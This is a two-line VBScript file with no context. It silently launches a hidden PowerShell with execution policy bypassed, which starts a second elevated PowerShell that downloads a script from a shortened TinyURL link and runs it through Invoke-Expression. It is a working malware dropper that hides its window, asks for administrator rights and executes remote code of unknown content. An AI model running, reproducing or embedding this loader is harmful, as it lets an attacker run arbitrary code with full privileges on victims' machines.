Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process powershell.exe -ArgumentList 'irm ""https://tinyurl.com/4j72ashp"" | iex' -WindowStyle Hidden -Verb RunAs""", 0, False
